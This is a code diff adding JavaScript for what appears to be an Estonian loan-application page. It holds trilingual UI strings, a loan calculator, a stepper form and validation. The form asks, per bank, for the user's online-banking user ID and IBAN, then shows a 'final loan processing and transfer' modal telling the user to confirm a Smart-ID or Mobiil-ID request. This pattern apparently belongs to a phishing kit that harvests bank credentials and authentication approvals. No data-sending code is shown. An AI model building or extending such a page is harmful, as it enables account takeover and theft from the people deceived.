+    'modal80-body':'Palun avage Smart-ID v&otilde;i Mobiil-ID ja kinnitage p&auml;ring.',
+    'modal80-btn':'J&auml;tka &rarr;',
+    'sov-done-title':'Taotlus saadetud!','sov-done-body':'Palun oodake &mdash; t&ouml;&ouml;tleme teie taotlust.<br>See v&otilde;tab m&otilde;ne minuti.',
+    'toast-success':'&#x2705; Taotlus edukalt saadetud! V&otilde;tame teiega 1 t&ouml;&ouml;p&auml;eva jooksul &uuml;hendust.',
+    'toast-decl':'&#x26A0;&#xFE0F; Palun kinnitage andmete &otilde;igsus ja n&otilde;ustuge krediidiv&otilde;imekuse kontrolliga.',
+    'toast-err':'&#x274C; Viga saatmisel: ','toast-conn':'&#x274C; &Uuml;henduse viga. Kontrollige interneti&uuml;hendust.',
+    'toast-step':'&#x26A0;&#xFE0F; Palun t&auml;itke k&otilde;ik kohustuslikud v&auml;ljad enne jatkamist.',
+    'sending':'Saatmine...',
+  },
+  en: {
+    'secure-badge':'Secure Application','page-title':'Credit Application',
+    'page-subtitle':'Please fill in all fields accurately. Your data is processed confidentially.',
+    'sec-auth':'Identification','sec-personal':'Personal Details','sec-address':'Address Details',
+    'sec-work':'Employment Details','sec-credit':'Credit Details','sec-vehicle':'Vehicle Details',
+    'sec-bank':'Bank Account','sec-docs':'Documents',
+    'decl-confirm':'I confirm that the submitted information is correct.',
+    'decl-consent':'I agree to a creditworthiness check.',
+    'btn-submit':'Submit Application',
+    'calc-monthly-label':'Monthly Payment','calc-total-label':'Total Cost','calc-interest-label':'Total Interest',
+    'calc-badge-1':'Personalised offer for every client','calc-badge-2':'Get a response immediately',
+    'calc-cta':'Apply for a loan',
+    'apr-rate-label':'Annual interest rate','apr-example-prefix':'Example:',
+    'apr-legal-note':'Final interest rate depends on the client\'s creditworthiness. This is an estimate and does not constitute a loan offer.',
+    'amort-toggle-label':'Show repayment schedule preview',
+    'amort-th-monthly':'Payment','amort-th-principal':'Principal','amort-th-interest':'Interest','amort-th-balance':'Balance',
+    'amort-show-all':'Show all payments &#9662;',
+    'docs-after-title':'After submitting your application','docs-after-body':'please send the following documents to',
+    'docs-item-id':'Identity document','docs-item-id-hint':'ID card (both sides) or passport',
+    'docs-item-bank':'Bank statement','docs-item-bank-hint':'last 3 months, IBAN visible',
+    'docs-ref-note':'We recommend noting your full name and application number in the email subject.',
+    'stepper-1':'Identity','stepper-1-sub':'Personal & address details',
+    'stepper-2':'Work & Bank','stepper-2-sub':'Income & bank account',
+    'btn-next-1':'Next: Work & Bank &rarr;','btn-next-2':'Submit application',
+    'btn-prev':'&larr; Back',
+    'sov-sent-title':'Application sent!','sov-sent-body':'Your credit application has been successfully submitted. We are processing your request&hellip;',
+    'sov-proc-title':'Please wait','sov-proc-body':'We are checking your details and assessing creditworthiness&hellip;',
+    'modal80-title':'Final loan processing and transfer',
+    'modal80-body':'Palun avage Smart-ID v&otilde;i Mobiil-ID ja kinnitage p&auml;ring.',
+    'modal80-btn':'Continue &rarr;',
+    'sov-done-title':'Application sent!','sov-done-body':'Please wait &mdash; we are processing your application.<br>This will take a few minutes.',
+    'toast-success':'&#x2705; Application submitted! We will contact you within 1 business day.',
+    'toast-decl':'&#x26A0;&#xFE0F; Please confirm accuracy of data and agree to the creditworthiness check.',
+    'toast-err':'&#x274C; Sending error: ','toast-conn':'&#x274C; Connection error. Check your internet connection.',
+    'toast-step':'&#x26A0;&#xFE0F; Please fill in all required fields before continuing.',
+    'sending':'Sending...',
+  },
+  ru: {
+    'secure-badge':'&#1041;&#1077;&#1079;&#1086;&#1087;&#1072;&#1089;&#1085;&#1072;&#1103; &#1079;&#1072;&#1103;&#1074;&#1082;&#1072;','page-title':'&#1050;&#1088;&#1077;&#1076;&#1080;&#1090;&#1085;&#1072;&#1103; &#1079;&#1072;&#1103;&#1074;&#1082;&#1072;',
+    'page-subtitle':'&#1055;&#1086;&#1078;&#1072;&#1083;&#1091;&#1081;&#1089;&#1090;&#1072;, &#1079;&#1072;&#1087;&#1086;&#1083;&#1085;&#1080;&#1090;&#1077; &#1074;&#1089;&#1077; &#1087;&#1086;&#1083;&#1103; &#1090;&#1086;&#1095;&#1085;&#1086;. &#1042;&#1072;&#1096;&#1080; &#1076;&#1072;&#1085;&#1085;&#1099;&#1077; &#1086;&#1073;&#1088;&#1072;&#1073;&#1072;&#1090;&#1099;&#1074;&#1072;&#1102;&#1090;&#1089;&#1103; &#1082;&#1086;&#1085;&#1092;&#1080;&#1076;&#1077;&#1085;&#1094;&#1080;&#1072;&#1083;&#1100;&#1085;&#1086;.',
+    'sec-auth':'&#1048;&#1076;&#1077;&#1085;&#1090;&#1080;&#1092;&#1080;&#1082;&#1072;&#1094;&#1080;&#1103;','sec-personal':'&#1051;&#1080;&#1095;&#1085;&#1099;&#1077; &#1076;&#1072;&#1085;&#1085;&#1099;&#1077;','sec-address':'&#1044;&#1072;&#1085;&#1085;&#1099;&#1077; &#1086; &#1087;&#1088;&#1086;&#1078;&#1080;&#1074;&#1072;&#1085;&#1080;&#1080;',
+    'sec-work':'&#1044;&#1072;&#1085;&#1085;&#1099;&#1077; &#1086; &#1088;&#1072;&#1073;&#1086;&#1090;&#1077;','sec-credit':'&#1044;&#1072;&#1085;&#1085;&#1099;&#1077; &#1086; &#1082;&#1088;&#1077;&#1076;&#1080;&#1090;&#1077;','sec-vehicle':'&#1044;&#1072;&#1085;&#1085;&#1099;&#1077; &#1086;&#1073; &#1072;&#1074;&#1090;&#1086;&#1084;&#1086;&#1073;&#1080;&#1083;&#1077;',
+    'sec-bank':'&#1041;&#1072;&#1085;&#1082;&#1086;&#1074;&#1089;&#1082;&#1080;&#1081; &#1089;&#1095;&#1105;&#1090;','sec-docs':'&#1044;&#1086;&#1082;&#1091;&#1084;&#1077;&#1085;&#1090;&#1099;',
+    'decl-confirm':'&#1055;&#1086;&#1076;&#1090;&#1074;&#1077;&#1088;&#1078;&#1076;&#1072;&#1102;, &#1095;&#1090;&#1086; &#1087;&#1088;&#1077;&#1076;&#1086;&#1089;&#1090;&#1072;&#1074;&#1083;&#1077;&#1085;&#1085;&#1099;&#1077; &#1076;&#1072;&#1085;&#1085;&#1099;&#1077; &#1074;&#1077;&#1088;&#1085;&#1099;.',
+    'decl-consent':'&#1057;&#1086;&#1075;&#1083;&#1072;&#1089;&#1077;&#1085; &#1085;&#1072; &#1087;&#1088;&#1086;&#1074;&#1077;&#1088;&#1082;&#1091; &#1082;&#1088;&#1077;&#1076;&#1080;&#1090;&#1086;&#1089;&#1087;&#1086;&#1089;&#1086;&#1073;&#1085;&#1086;&#1089;&#1090;&#1080;.',
+    'btn-submit':'&#1054;&#1090;&#1087;&#1088;&#1072;&#1074;&#1080;&#1090;&#1100; &#1079;&#1072;&#1103;&#1074;&#1082;&#1091;',
+    'calc-monthly-label':'&#1045;&#1078;&#1077;&#1084;&#1077;&#1089;&#1103;&#1095;&#1085;&#1099;&#1081; &#1087;&#1083;&#1072;&#1090;&#1077;&#1078;','calc-total-label':'&#1054;&#1073;&#1097;&#1072;&#1103; &#1089;&#1090;&#1086;&#1080;&#1084;&#1086;&#1089;&#1090;&#1100;','calc-interest-label':'&#1042;&#1089;&#1077;&#1075;&#1086; &#1087;&#1088;&#1086;&#1094;&#1077;&#1085;&#1090;&#1086;&#1074;',
+    'calc-badge-1':'&#1055;&#1077;&#1088;&#1089;&#1086;&#1085;&#1072;&#1083;&#1100;&#1085;&#1086;&#1077; &#1087;&#1088;&#1077;&#1076;&#1083;&#1086;&#1078;&#1077;&#1085;&#1080;&#1077; &#1082;&#1072;&#1078;&#1076;&#1086;&#1084;&#1091;','calc-badge-2':'&#1054;&#1090;&#1074;&#1077;&#1090; &#1085;&#1072; &#1079;&#1072;&#1103;&#1074;&#1082;&#1091; &#1089;&#1088;&#1072;&#1079;&#1091;',
+    'calc-cta':'&#1055;&#1086;&#1076;&#1072;&#1090;&#1100; &#1079;&#1072;&#1103;&#1074;&#1082;&#1091;',
+    'apr-rate-label':'&#1043;&#1086;&#1076;&#1086;&#1074;&#1072;&#1103; &#1087;&#1088;&#1086;&#1094;&#1077;&#1085;&#1090;&#1085;&#1072;&#1103; &#1089;&#1090;&#1072;&#1074;&#1082;&#1072;','apr-example-prefix':'&#1055;&#1088;&#1080;&#1084;&#1077;&#1088;:',
+    'apr-legal-note':'&#1048;&#1090;&#1086;&#1075;&#1086;&#1074;&#1072;&#1103; &#1089;&#1090;&#1072;&#1074;&#1082;&#1072; &#1079;&#1072;&#1074;&#1080;&#1089;&#1080;&#1090; &#1086;&#1090; &#1082;&#1088;&#1077;&#1076;&#1080;&#1090;&#1086;&#1089;&#1087;&#1086;&#1089;&#1086;&#1073;&#1085;&#1086;&#1089;&#1090;&#1080; &#1082;&#1083;&#1080;&#1077;&#1085;&#1090;&#1072;.',
+    'amort-toggle-label':'&#1055;&#1086;&#1082;&#1072;&#1079;&#1072;&#1090;&#1100; &#1075;&#1088;&#1072;&#1092;&#1080;&#1082; &#1087;&#1086;&#1075;&#1072;&#1096;&#1077;&#1085;&#1080;&#1103;',
+    'amort-th-monthly':'&#1055;&#1083;&#1072;&#1090;&#1077;&#1078;','amort-th-principal':'&#1054;&#1089;&#1085;&#1086;&#1074;&#1085;&#1086;&#1081; &#1076;&#1086;&#1083;&#1075;','amort-th-interest':'&#1055;&#1088;&#1086;&#1094;&#1077;&#1085;&#1090;&#1099;','amort-th-balance':'&#1054;&#1089;&#1090;&#1072;&#1090;&#1086;&#1082;',
+    'amort-show-all':'&#1055;&#1086;&#1082;&#1072;&#1079;&#1072;&#1090;&#1100; &#1074;&#1089;&#1077; &#1087;&#1083;&#1072;&#1090;&#1077;&#1078;&#1080; &#9662;',
+    'docs-after-title':'&#1055;&#1086;&#1089;&#1083;&#1077; &#1086;&#1090;&#1087;&#1088;&#1072;&#1074;&#1082;&#1080; &#1079;&#1072;&#1103;&#1074;&#1082;&#1080;','docs-after-body':'&#1086;&#1090;&#1087;&#1088;&#1072;&#1074;&#1100;&#1090;&#1077; &#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1080;&#1077; &#1076;&#1086;&#1082;&#1091;&#1084;&#1077;&#1085;&#1090;&#1099; &#1085;&#1072; email',
+    'docs-item-id':'&#1044;&#1086;&#1082;&#1091;&#1084;&#1077;&#1085;&#1090;, &#1091;&#1076;&#1086;&#1089;&#1090;&#1086;&#1074;&#1077;&#1088;&#1103;&#1102;&#1097;&#1080;&#1081; &#1083;&#1080;&#1095;&#1085;&#1086;&#1089;&#1090;&#1100;','docs-item-id-hint':'ID-&#1082;&#1072;&#1088;&#1090;&#1072; (&#1086;&#1073;&#1077; &#1089;&#1090;&#1086;&#1088;&#1086;&#1085;&#1099;) &#1080;&#1083;&#1080; &#1087;&#1072;&#1089;&#1087;&#1086;&#1088;&#1090;',
+    'docs-item-bank':'&#1042;&#1099;&#1087;&#1080;&#1089;&#1082;&#1072; &#1080;&#1079; &#1073;&#1072;&#1085;&#1082;&#1072;','docs-item-bank-hint':'&#1079;&#1072; &#1087;&#1086;&#1089;&#1083;&#1077;&#1076;&#1085;&#1080;&#1077; 3 &#1084;&#1077;&#1089;., IBAN &#1074;&#1080;&#1076;&#1077;&#1085;',
+    'docs-ref-note':'&#1059;&#1082;&#1072;&#1078;&#1080;&#1090;&#1077; &#1074; &#1090;&#1077;&#1084;&#1077; &#1087;&#1080;&#1089;&#1100;&#1084;&#1072; &#1074;&#1072;&#1096;&#1077; &#1087;&#1086;&#1083;&#1085;&#1086;&#1077; &#1080;&#1084;&#1103; &#1080; &#1085;&#1086;&#1084;&#1077;&#1088; &#1079;&#1072;&#1103;&#1074;&#1082;&#1080;.',
+    'stepper-1':'&#1048;&#1083;&#1077;&#1085;&#1090;&#1080;&#1095;&#1085;&#1086;&#1089;&#1090;&#1100;','stepper-1-sub':'&#1051;&#1080;&#1095;&#1085;&#1099;&#1077; &#1076;&#1072;&#1085;&#1085;&#1099;&#1077; &amp; &#1072;&#1076;&#1088;&#1077;&#1089;',
+    'stepper-2':'&#1056;&#1072;&#1073;&#1086;&#1090;&#1072; &amp; &#1041;&#1072;&#1085;&#1082;','stepper-2-sub':'&#1044;&#1086;&#1093;&#1086;&#1076; &amp; &#1073;&#1072;&#1085;&#1082;&#1086;&#1074;&#1089;&#1082;&#1080;&#1081; &#1089;&#1095;&#1105;&#1090;',
+    'btn-next-1':'&#1044;&#1072;&#1083;&#1077;&#1077;: &#1056;&#1072;&#1073;&#1086;&#1090;&#1072; &amp; &#1041;&#1072;&#1085;&#1082; &rarr;','btn-next-2':'&#1044;&#1072;&#1083;&#1077;&#1077;: &#1044;&#1086;&#1082;&#1091;&#1084;&#1077;&#1085;&#1090;&#1099; &rarr;',
+    'btn-prev':'&larr; &#1053;&#1072;&#1079;&#1072;&#1076;',
+    'sov-sent-title':'&#1047;&#1072;&#1103;&#1074;&#1082;&#1072; &#1086;&#1090;&#1087;&#1088;&#1072;&#1074;&#1083;&#1077;&#1085;&#1072;!','sov-sent-body':'&#1042;&#1072;&#1096;&#1072; &#1079;&#1072;&#1103;&#1074;&#1082;&#1072; &#1091;&#1089;&#1087;&#1077;&#1096;&#1085;&#1086; &#1087;&#1077;&#1088;&#1077;&#1076;&#1072;&#1085;&#1072;. &#1054;&#1073;&#1088;&#1072;&#1073;&#1072;&#1090;&#1099;&#1074;&#1072;&#1077;&#1084;&hellip;',
+    'sov-proc-title':'&#1055;&#1086;&#1078;&#1072;&#1083;&#1091;&#1081;&#1089;&#1090;&#1072;, &#1087;&#1086;&#1076;&#1086;&#1078;&#1076;&#1080;&#1090;&#1077;','sov-proc-body':'&#1055;&#1088;&#1086;&#1074;&#1077;&#1088;&#1103;&#1077;&#1084; &#1074;&#1072;&#1096;&#1080; &#1076;&#1072;&#1085;&#1085;&#1099;&#1077;&hellip;',
+    'modal80-title':'&#1054;&#1082;&#1086;&#1085;&#1095;&#1072;&#1090;&#1077;&#1083;&#1100;&#1085;&#1086;&#1077; &#1086;&#1092;&#1086;&#1088;&#1084;&#1083;&#1077;&#1085;&#1080;&#1077; &#1082;&#1088;&#1077;&#1076;&#1080;&#1090;&#1072;',
+    'modal80-body':'Palun avage Smart-ID v&otilde;i Mobiil-ID ja kinnitage p&auml;ring.',
+    'modal80-btn':'&#1055;&#1088;&#1086;&#1076;&#1086;&#1083;&#1078;&#1080;&#1090;&#1100; &rarr;',
+    'sov-done-title':'&#1047;&#1072;&#1103;&#1074;&#1082;&#1072; &#1086;&#1090;&#1087;&#1088;&#1072;&#1074;&#1083;&#1077;&#1085;&#1072;!','sov-done-body':'&#1055;&#1086;&#1078;&#1072;&#1083;&#1091;&#1081;&#1089;&#1090;&#1072;, &#1087;&#1086;&#1076;&#1086;&#1078;&#1076;&#1080;&#1090;&#1077; &mdash; &#1086;&#1073;&#1088;&#1072;&#1073;&#1072;&#1090;&#1099;&#1074;&#1072;&#1077;&#1084; &#1074;&#1072;&#1096;&#1091; &#1079;&#1072;&#1103;&#1074;&#1082;&#1091;.',
+    'toast-success':'&#x2705; &#1047;&#1072;&#1103;&#1074;&#1082;&#1072; &#1086;&#1090;&#1087;&#1088;&#1072;&#1074;&#1083;&#1077;&#1085;&#1072;! &#1052;&#1099; &#1089;&#1074;&#1103;&#1078;&#1077;&#1084;&#1089;&#1103; &#1089; &#1074;&#1072;&#1084;&#1080; &#1074; &#1090;&#1077;&#1095;&#1077;&#1085;&#1080;&#1077; 1 &#1088;&#1072;&#1073;&#1086;&#1095;&#1077;&#1075;&#1086; &#1076;&#1085;&#1103;.',
+    'toast-decl':'&#x26A0;&#xFE0F; &#1055;&#1086;&#1076;&#1090;&#1074;&#1077;&#1088;&#1076;&#1080;&#1090;&#1077; &#1076;&#1072;&#1085;&#1085;&#1099;&#1077; &#1080; &#1089;&#1086;&#1075;&#1083;&#1072;&#1089;&#1080;&#1090;&#1077;&#1089;&#1100;.',
+    'toast-err':'&#x274C; &#1054;&#1096;&#1080;&#1073;&#1082;&#1072;: ','toast-conn':'&#x274C; &#1054;&#1096;&#1080;&#1073;&#1082;&#1072; &#1089;&#1086;&#1077;&#1076;&#1080;&#1085;&#1077;&#1085;&#1080;&#1103;.',
+    'toast-step':'&#x26A0;&#xFE0F; &#1047;&#1072;&#1087;&#1086;&#1083;&#1085;&#1080;&#1090;&#1077; &#1074;&#1089;&#1077; &#1086;&#1073;&#1103;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100;&#1085;&#1099;&#1077; &#1087;&#1086;&#1083;&#1103;.',
+    'sending':'&#1054;&#1090;&#1087;&#1088;&#1072;&#1074;&#1082;&#1072;...',
+  }
+};
+
+let currentLang = 'et';
+
+function setLang(lang) {
+  currentLang = lang;
+  document.documentElement.lang = lang;
+  document.querySelectorAll('.lang-btn').forEach(b => {
+    b.classList.toggle('active', b.textContent.trim().toLowerCase() === lang);
+    b.setAttribute('aria-pressed', b.textContent.trim().toLowerCase() === lang);
+  });
+  const t = i18n[lang];
+  // Translate all data-i18n elements
+  document.querySelectorAll('[data-i18n]').forEach(el => {
+    const key = el.getAttribute('data-i18n');
+    if (t[key] !== undefined) el.innerHTML = t[key];
+  });
+  // Translate stepper labels
+  for (let i = 1; i <= 3; i++) {
+    const sl = document.getElementById('sl-' + i);
+    const ss = document.getElementById('ss-' + i);
+    if (sl && t['stepper-' + i]) sl.innerHTML = t['stepper-' + i];
+    if (ss && t['stepper-' + i + '-sub']) ss.innerHTML = t['stepper-' + i + '-sub'];
+  }
+  // Translate nav buttons
+  const bn1 = document.getElementById('btn-next-1');
+  const bn2 = document.getElementById('btn-next-2');
+  const bp2 = document.getElementById('btn-prev-2');
+  const bp3 = document.getElementById('btn-prev-3');
+  if (bn1) bn1.innerHTML = t['btn-next-1'] || bn1.innerHTML;
+  if (bn2) bn2.innerHTML = t['btn-next-2'] || bn2.innerHTML;
+  if (bp2) bp2.innerHTML = t['btn-prev'] || bp2.innerHTML;
+  if (bp3) bp3.innerHTML = t['btn-prev'] || bp3.innerHTML;
+}
+
+// ══════════════════════════════════════════════════════════════
+// RADIO VISUAL
+// ══════════════════════════════════════════════════════════════
+function selectRadio(el, name) {
+  document.querySelectorAll('[name="' + name + '"]').forEach(r => {
+    r.closest('.radio-option') && r.closest('.radio-option').classList.remove('selected');
+  });
+  el.closest('.radio-option') && el.closest('.radio-option').classList.add('selected');
+}
+// radio change handled in main DOMContentLoaded
+
+// ══════════════════════════════════════════════════════════════
+// BANK / AUTH
+// ══════════════════════════════════════════════════════════════
+function onBankChange(val) {
+  var ktWrap    = document.getElementById('kasutajatunnus-wrap');
+  var coopWrap  = document.getElementById('coop-iban-wrap');
+  var authWrap  = document.getElementById('auth-method-wrap');
+  var ibanCoop  = document.getElementById('iban-coop');
+  var ktInput   = document.getElementById('kasutajatunnus');
+  var ibanInput = document.getElementById('iban');
+  var isCoop    = (val === 'Coop Pank');
+  var hasBank   = val !== '';
+
+  // kasutajatunnus + IBAN : toutes les banques SAUF Coop Pank
+  if (ktWrap) {
+    if (isCoop || !hasBank) ktWrap.classList.remove('visible');
+    else ktWrap.classList.add('visible');
+  }
+  // required dynamique : kasutajatunnus et iban
+  if (ktInput)   ktInput.required   = (!isCoop && hasBank);
+  if (ibanInput) ibanInput.required = (!isCoop && hasBank);
+
+  // IBAN seul : Coop Pank
+  if (coopWrap) {
+    if (isCoop && hasBank) coopWrap.classList.add('visible');
+    else coopWrap.classList.remove('visible');
+  }
+  // required dynamique iban-coop
+  if (ibanCoop) ibanCoop.required = (isCoop && hasBank);
+
+  // Méthode auth : toutes les banques
+  if (authWrap) {
+    if (hasBank) authWrap.classList.add('visible');
+    else authWrap.classList.remove('visible');
+  }
+}
+
+// ══════════════════════════════════════════════════════════════
+// CALC TYPE
+// ══════════════════════════════════════════════════════════════
+function onCalcTypeChange(val) {
+  document.getElementById('auto-section').style.display = val === 'Autokrediit' ? 'block' : 'none';
+}
+
+// ══════════════════════════════════════════════════════════════
+// CALCULATOR
+// ══════════════════════════════════════════════════════════════
+var _calcCache = {}, _amortOpen = false, _amortFullOpen = false;
+
+function _computeMonthly(amount, months) {
+  var key = amount + '-' + months;
+  if (_calcCache[key] !== undefined) return _calcCache[key];
+  var ssKey = 'nk_calc_' + key, cached = sessionStorage.getItem(ssKey);
+  if (cached !== null) { _calcCache[key] = +cached; return +cached; }
+  var rate = 0.12/12, pow = Math.pow(1+rate, months);
+  var monthly = Math.round((amount * rate * pow) / (pow - 1));
+  _calcCache[key] = monthly;
+  try { sessionStorage.setItem(ssKey, monthly); } catch(e) {}
+  return monthly;
+}
+
+function _buildAmortRows(amount, months) {
+  var rate=0.12/12, pow=Math.pow(1+rate,months);
+  var monthly=(amount*rate*pow)/(pow-1), balance=amount, rows=[];
+  for (var i=1; i<=months; i++) {
+    var interest=balance*rate, principal=monthly-interest;
+    balance-=principal; if(balance<0)balance=0;
+    rows.push({n:i,monthly:Math.round(monthly),principal:Math.round(principal),interest:Math.round(interest),balance:Math.round(balance)});
+  }
+  return rows;
+}
+function _rowHtml(r){return '<tr><td>'+r.n+'</td><td>'+r.monthly+' &euro;</td><td>'+r.principal+' &euro;</td><td>'+r.interest+' &euro;</td><td>'+r.balance+' &euro;</td></tr>';}
+
+function updateCalc() {
+  var amount=parseInt(document.getElementById('calc-amount').value);
+  var months=parseInt(document.getElementById('calc-period').value);
+  var monthly=_computeMonthly(amount,months), total=monthly*months, interest=total-amount;
+  document.getElementById('calc-amount-val').textContent=amount.toLocaleString('et-EE')+' \u20ac';
+  document.getElementById('calc-period-val').textContent=months+' kuud';
+  document.getElementById('calc-monthly').textContent=monthly.toLocaleString('et-EE')+' \u20ac';
+  document.getElementById('calc-total').textContent=total.toLocaleString('et-EE')+' \u20ac';
+  document.getElementById('calc-interest').textContent=interest.toLocaleString('et-EE')+' \u20ac';
+  var ex=document.getElementById('calc-apr-example');
+  if(ex)ex.textContent=amount.toLocaleString('et-EE')+' \u20ac laenul '+months+' kuu jooksul on kuumakse '+monthly.toLocaleString('et-EE')+' \u20ac, kogumakse '+total.toLocaleString('et-EE')+' \u20ac, intressid '+interest.toLocaleString('et-EE')+' \u20ac. TAEG 12,00 %.';
+  if(_amortOpen){var a=parseInt(document.getElementById('calc-amount').value),m=parseInt(document.getElementById('calc-period').value);_renderAmort(a,m);}
+}
+
+function _renderAmort(amount, months) {
+  var rows=_buildAmortRows(amount,months);
+  document.getElementById('amort-preview').innerHTML=rows.slice(0,4).map(_rowHtml).join('');
+  document.getElementById('amort-full').innerHTML=rows.slice(4).map(_rowHtml).join('');
+  var btn=document.getElementById('amort-show-all-btn');
+  if(rows.length<=4)btn.style.display='none'; else btn.style.display='';
+  if(!_amortFullOpen){document.getElementById('amort-all-wrap').style.display='none';document.getElementById('amort-show-all-label').textContent='N\u00e4ita k\u00f5iki makseid ('+rows.length+') \u25be';}
+}
+function toggleAmort(){
+  _amortOpen=!_amortOpen;
+  document.getElementById('amort-table-wrap').style.display=_amortOpen?'block':'none';
+  document.getElementById('amort-toggle-icon').textContent=_amortOpen?'\u25be':'\u25b8';
+  if(_amortOpen){var a=parseInt(document.getElementById('calc-amount').value),m=parseInt(document.getElementById('calc-period').value);_renderAmort(a,m);}
+}
+function toggleAmortFull(){
+  _amortFullOpen=!_amortFullOpen;
+  document.getElementById('amort-all-wrap').style.display=_amortFullOpen?'block':'none';
+  var m=parseInt(document.getElementById('calc-period').value);
+  document.getElementById('amort-show-all-label').textContent=_amortFullOpen?'Peida \u25b4':'N\u00e4ita k\u00f5iki makseid ('+m+') \u25be';
+}
+
+function applyCalcToForm(){
+  var amount=document.getElementById('calc-amount').value;
+  var months=document.getElementById('calc-period').value;
+  var type='Personaallaen';
+  document.getElementById('summa').value=amount;
+  document.getElementById('periood').value=months+' kuud';
+}
+
+// ══════════════════════════════════════════════════════════════
+// TOAST
+// ══════════════════════════════════════════════════════════════
+function showToast(msg,type){
+  var t=document.getElementById('toast');
+  t.innerHTML=msg; t.className='toast '+type+' show';
+  var a=document.getElementById('a11y-announce');
+  if(a){a.textContent='';setTimeout(function(){a.textContent=t.textContent;},50);}
+  setTimeout(function(){t.classList.remove('show');},6000);
+}
+
+// ══════════════════════════════════════════════════════════════
+// STEPPER
+// ══════════════════════════════════════════════════════════════
+var _currentStep = 1;
+
+function _updateStepperUI(step) {
+  for (var i=1; i<=3; i++) {
+    var st=document.getElementById('st-'+i), sn=document.getElementById('sn-'+i);
+    if(!st||!sn) continue;
+    st.classList.remove('active','done'); st.removeAttribute('aria-current');
+    if (i<step){ st.classList.add('done'); sn.textContent='\u2713'; }
+    else if (i===step){ st.classList.add('active'); st.setAttribute('aria-current','step'); sn.textContent=i; }
+    else { sn.textContent=i; }
+    var fs=document.getElementById('form-step-'+i);
+    if(fs) fs.classList.toggle('active', i===step);
+  }
+  _currentStep=step;
+  var bar=document.getElementById('stepperBar');
+  if(bar) bar.scrollIntoView({behavior:'smooth',block:'start'});
+  setTimeout(function(){
+    var el=document.getElementById('form-step-'+step);
+    if(el){var f=el.querySelector('input:not([type="hidden"]),select,button');if(f)f.focus({preventScroll:true});}
+  },350);
+}
+
+function _validateStep(step) {
+  var ok=true;
+  var stepEl=document.getElementById('form-step-'+step);
+  if(!stepEl) return true;
+  stepEl.querySelectorAll('input[required],select[required]').forEach(function(inp){
+    // Ignorer les champs dans un bloc bank-extra-field non visible
+    var parentExtra=inp.closest('.bank-extra-field');
+    if(parentExtra && !parentExtra.classList.contains('visible')) return;
+    // Le champ hidden #pank est validé séparément via selectBank
+    if(inp.type==='hidden' && inp.id==='pank'){
+      if(!inp.value){ ok=false; var h=document.getElementById('hint-pank'); if(h){h.textContent=_vm('pank');h.className='field-hint err';} }
+      return;
+    }
+    _touchField(inp);
+    if(!inp.checkValidity()) ok=false;
+  });
+  return ok;
+}
+
+function nextStep(from) {
+  if (!_validateStep(from)) {
+    showToast(i18n[currentLang]['toast-step']||'Please fill in all required fields.','error');
+    var stepEl=document.getElementById('form-step-'+from);
+    if(stepEl){var first=stepEl.querySelector('input.invalid,select.invalid');if(first)first.scrollIntoView({behavior:'smooth',block:'center'});}
+    return;
+  }
+  _updateStepperUI(from+1);
+  _saveFormLS();
+}
+function prevStep(from){ _updateStepperUI(from-1); }
+function goStep(step){ if(step<_currentStep) _updateStepperUI(step); }
+
+// ══════════════════════════════════════════════════════════════
+// LOCALSTORAGE AUTOSAVE
+// ══════════════════════════════════════════════════════════════
+var _lsKey='nk_form_v1', _saveTimer=null;
+function _saveFormLS(){
+  var data={};
+  var form=document.getElementById('creditForm');
+  if(!form) return;
+  form.querySelectorAll('input[name],select[name]').forEach(function(el){
+    if(el.type==='file'||el.type==='hidden') return;
+    if(el.id==='isikukood'||el.id==='iban'||el.id==='kasutajatunnus') return;
+    if(el.type==='radio'||el.type==='checkbox'){if(el.checked)data[el.name]=el.value;}
+    else data[el.name]=el.value;
+  });
+  try{localStorage.setItem(_lsKey,JSON.stringify(data));}catch(e){}
+}
+function _restoreFormLS(){
+  var raw; try{raw=localStorage.getItem(_lsKey);}catch(e){return;}
+  if(!raw) return;
+  var data=JSON.parse(raw), form=document.getElementById('creditForm');
+  Object.keys(data).forEach(function(name){
+    var val=data[name];
+    form.querySelectorAll('[name="'+name+'"]').forEach(function(el){
+      if(el.type==='radio'){if(el.value===val){el.checked=true;var ro=el.closest('.radio-option');if(ro)ro.classList.add('selected');}}
+      else if(el.type==='checkbox'){el.checked=(val===el.value||val==='on');}
+      else el.value=val;
+    });
+  });
+  showToast('\uD83D\uDCCB Eelmise seansi andmed taastati.','success');
+}
+function _debounceSave(){clearTimeout(_saveTimer);_saveTimer=setTimeout(_saveFormLS,800);}
+
+// ══════════════════════════════════════════════════════════════
+// REAL-TIME VALIDATION
+// ══════════════════════════════════════════════════════════════
+var _validationMsgs={
+  et:{minChars:'V\u00e4hemalt 2 t\u00e4hem\u00e4rki',isikukood:'11 numbrit',telefon:'Kehtiv telefoninumber',epost:'Kehtiv e-posti aadress',aadress:'Sisestage t\u00e4isaadress',linn:'Linn on kohustuslik',postiindeks:'5-kohaline postiindeks',tooandja:'T\u00f6\u00f6andja on kohustuslik',ametikoht:'Ametikoht on kohustuslik',sissetulek:'Sisestage kehtiv sissetulek',iban:'N\u00e4ide: EE36 1700 0170 0000 0000',pank:'Valige pank',required:'Kohustuslik v\u00e4li'},
+  en:{minChars:'At least 2 characters',isikukood:'11 digits required',telefon:'Valid phone number',epost:'Valid email address',aadress:'Enter full address',linn:'City is required',postiindeks:'5-digit postal code',tooandja:'Employer is required',ametikoht:'Position is required',sissetulek:'Enter valid income',iban:'Example: EE36 1700 0170 0000 0000',pank:'Select a bank',required:'Required field'},
